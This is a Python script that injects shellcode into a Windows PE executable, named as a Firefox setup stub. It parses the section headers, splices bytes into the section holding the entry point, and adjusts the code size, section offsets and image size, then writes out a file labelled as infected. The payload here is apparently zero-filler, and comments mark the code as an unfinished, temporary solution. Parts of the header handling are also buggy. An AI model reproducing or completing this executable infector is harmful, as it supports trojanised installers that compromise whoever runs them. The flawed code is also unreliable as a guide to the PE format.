import os
from ShellCodeGenerators.ZeroFiller import ZeroFiller

OFFSET_TO_PE_HEADER_OFFSET = 0x3C
OFFSET_TO_ENTRYPOINT_RVA = 0x28
OFFSET_TO_NUMBER_OF_SECTIONS = 0x6
OFFSET_TO_SIZE_OF_CODE = 0x1C
OFFSET_TO_BASE_OF_CODE_RVA = 0x2C
OFFSET_TO_BASE_OF_DATA_RVA = 0x30
OFFSET_TO_SECTION_ALIGNMENT = 0x38
OFFSET_TO_FILE_ALIGNMENT = 0x3C
OFFSET_TO_SIZE_OF_IMAGE = 0x50

OFFSET_TO_BEGINNING_OF_SECTION_HEADERS = 0xF8
OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER = 0X8
OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER = 0XC
OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER = 0x10
OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER = 0X14

SECTION_HEADER_SIZE = 0x28
BITS_PER_BYTE = 8



BINARIES_PATH='./Binaries/'
CLEAN_BINARY= 'Firefox Setup Stub 51.0.1.exe'
INFECTED_BINARY = CLEAN_BINARY+'.inf'

def get_dword_given_offset(binary_data, offset):
    return binary_data[offset] + \
           (binary_data[offset + 1] << BITS_PER_BYTE) + \
           (binary_data[offset + 2] << 2 * BITS_PER_BYTE) + \
           (binary_data[offset + 3] << 3 * BITS_PER_BYTE)

def set_dword_given_offset(binary_data, dword, offset):

    binary_data[offset] = (dword & 0xFF)
    binary_data[offset + 1] = ((dword >> BITS_PER_BYTE) & 0xFF)
    binary_data[offset + 2] = ((dword >> 2*BITS_PER_BYTE) & 0xFF)
    binary_data[offset + 3] = ((dword >> 3*BITS_PER_BYTE) & 0xFF)



def get_pe_header_offset(binary_data):

    return get_dword_given_offset(binary_data, OFFSET_TO_PE_HEADER_OFFSET)


def get_raw_entrypoint_offset(header_offset, binary_data):

    entrypoint_rva_offset = header_offset + OFFSET_TO_ENTRYPOINT_RVA
    entrypoint_rva = get_dword_given_offset(binary_data, entrypoint_rva_offset)


    number_of_sections_offset = header_offset + OFFSET_TO_NUMBER_OF_SECTIONS
    number_of_sections = binary_data[number_of_sections_offset] + (binary_data[number_of_sections_offset + 1] << BITS_PER_BYTE)
    current_header_offset = header_offset + OFFSET_TO_BEGINNING_OF_SECTION_HEADERS

    for section_index in range(0,number_of_sections):

       virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
       virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)

       virtual_section_rva_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
       virtual_section_rva = get_dword_given_offset(binary_data, virtual_section_rva_offset)

       virtual_end_of_section_rva = virtual_section_rva + virtual_section_size

       if entrypoint_rva >= virtual_section_rva and entrypoint_rva <= virtual_end_of_section_rva:
           raw_section_offset_offset = current_header_offset + OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
           raw_section_offset = get_dword_given_offset(binary_data, raw_section_offset_offset)


           return entrypoint_rva - virtual_section_rva + raw_section_offset

       current_header_offset += SECTION_HEADER_SIZE

'''
    Bad solution. Temporary.
'''

def inject_shell_code_at_offset(binary_data, offset, shell_code):
    shell_code_size = len(shell_code)
    first_half = binary_data[0:offset-1]
    second_half = binary_data[offset:]
    first_half.extend(shell_code)
    first_half.extend(second_half)
    return first_half


def adjust_headers(binary_data, header_offset, section_header_offset, number_of_sections, index_of_section_containing_shell_code, shell_code_size):

    #Set Size of Code field
    size_of_code_offset = header_offset + OFFSET_TO_SIZE_OF_CODE
    current_size_of_code = get_dword_given_offset(binary_data, size_of_code_offset)
    set_dword_given_offset(binary_data, current_size_of_code + shell_code_size, size_of_code_offset)

    section_alignment = get_dword_given_offset(binary_data, header_offset+OFFSET_TO_SECTION_ALIGNMENT)
    file_alignment = get_dword_given_offset(binary_data, header_offset+OFFSET_TO_FILE_ALIGNMENT)


      # -Get end of binary section - done
      #Size of image

        #-Change entrypoint
       #-Change Size of image
       #-Base of data
       #-Number of RVA and Sizes?

       #For each section after the code:
       #-VirtualAddress (RVA)
      # #-PointerToRawData
       #-Pointer to relocations
       #-Pointer to line numbers

      #Adjusting code section
    current_header_offset = section_header_offset

    #Set virtual section size for shellcoded section
    virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
    virtual_section_size = get_dword_given_offset(binary_data, virtual_section_size_offset)
    virtual_section_size += shell_code_size
    set_dword_given_offset(binary_data, virtual_section_size, virtual_section_size_offset)

    # Set raw section size for shellcoded section
    raw_section_size_offset = current_header_offset + OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
    raw_section_size = get_dword_given_offset(binary_data, raw_section_size_offset)
    raw_section_size += shell_code_size
    set_dword_given_offset(binary_data, raw_section_size, raw_section_size_offset)


    #If the base of cod and/or data is after the section with the shellcode, need to update header.
    base_of_code_rva_offset = header_offset + OFFSET_TO_BASE_OF_CODE_RVA
    base_of_code_rva = get_dword_given_offset(binary_data, base_of_code_rva_offset)

    base_of_data_rva_offset = header_offset + OFFSET_TO_BASE_OF_DATA_RVA
    base_of_data_rva = get_dword_given_offset(binary_data, base_of_data_rva_offset)

    #Moving to the nextion section header
    current_header_offset += SECTION_HEADER_SIZE

    for section_index in range(0, number_of_sections - index_of_section_containing_shell_code - 1):
        virtual_section_rva_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
        virtual_section_rva = get_dword_given_offset(binary_data, virtual_section_rva_offset)
        base_of_code_or_data = None

        if base_of_code_rva == virtual_section_rva:
            base_of_code_or_data = base_of_code_rva
        elif base_of_data_rva == virtual_section_rva:
            base_of_code_or_data = base_of_data_rva

        virtual_section_rva += shell_code_size
        last_virtual_section_rva = virtual_section_rva
        set_dword_given_offset(binary_data, virtual_section_rva, virtual_section_rva_offset)

        if base_of_code_or_data != None:
            set_dword_given_offset(binary_data,virtual_section_rva, base_of_code_or_data)

        raw_section_offset_offset = current_header_offset + OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
        raw_section_offset = get_dword_given_offset(binary_data, raw_section_offset_offset)
        raw_section_offset += shell_code_size
        set_dword_given_offset(binary_data, raw_section_offset, raw_section_offset_offset)

        virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER

        current_header_offset += SECTION_HEADER_SIZE

    #Sets size of image aligned to SectionAlignment
    size_of_image_offset = header_offset + OFFSET_TO_SIZE_OF_IMAGE
    current_size_of_image = get_dword_given_offset(binary_data, size_of_code_offset)
    unaligned_size_of_image = current_size_of_image + shell_code_size
    aligned_size_of_image = unaligned_size_of_image + (section_alignment - (unaligned_size_of_image % section_alignment))
    set_dword_given_offset(binary_data, aligned_size_of_image, size_of_image_offset)




def inject_shell_code(header_offset, binary_data, shell_code):
    entrypoint_rva_offset = header_offset + OFFSET_TO_ENTRYPOINT_RVA
    entrypoint_rva = get_dword_given_offset(binary_data, entrypoint_rva_offset)

    number_of_sections_offset = header_offset + OFFSET_TO_NUMBER_OF_SECTIONS
    number_of_sections = binary_data[number_of_sections_offset] + (
    binary_data[number_of_sections_offset + 1] << BITS_PER_BYTE)
    current_header_offset = header_offset + OFFSET_TO_BEGINNING_OF_SECTION_HEADERS

    for section_index in range(0, number_of_sections):

        virtual_section_size_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
        virtual_section_size = get_dword_given_offset(binary_data,virtual_section_size_offset)

        virtual_section_rva_offset = current_header_offset + OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
        virtual_section_rva = get_dword_given_offset(binary_data, virtual_section_rva_offset)

        virtual_end_of_section_rva = virtual_section_rva + virtual_section_size

        if entrypoint_rva >= virtual_section_rva and entrypoint_rva <= virtual_end_of_section_rva:
            break
        current_header_offset += SECTION_HEADER_SIZE


    #Get raw size and offset for section containing shellcode
    raw_section_size_offset = current_header_offset + OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
    raw_section_size = get_dword_given_offset(binary_data,raw_section_size_offset)
    raw_section_offset_offset = current_header_offset + OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
    raw_section_offset = get_dword_given_offset(binary_data,raw_section_offset_offset)

    file_alignment = get_dword_given_offset(binary_data, header_offset + OFFSET_TO_FILE_ALIGNMENT)
    new_raw_section_size_unaligned = raw_section_size + len(shell_code)
    padding_size = file_alignment - (new_raw_section_size_unaligned % file_alignment)
    padding = bytearray([0x0 for x in range(0,padding_size)])
    shell_code.extend(padding)

    infected_binary = inject_shell_code_at_offset(binary_data, raw_section_offset + raw_section_size, shell_code)

    adjust_headers(infected_binary, header_offset, current_header_offset, number_of_sections, section_index, len(shell_code))
    return infected_binary

if __name__=='__main__':

    binary_data = None

    with open(BINARIES_PATH+CLEAN_BINARY, "rb") as f:
        binary_data = bytearray(f.read())

    POINTER_TO_PE_HEADER_OFFSET = 0x3C

    header_offset = get_pe_header_offset(binary_data)


    raw_entrypoint_offset = get_raw_entrypoint_offset(header_offset, binary_data)

    zero_filler = ZeroFiller()
    infected_binary = inject_shell_code(header_offset,binary_data,zero_filler.get_shell_code())
    infected_binary_path = BINARIES_PATH+INFECTED_BINARY
    os.remove(infected_binary_path)

    with open(infected_binary_path, "wb") as f:
        f.write(infected_binary)



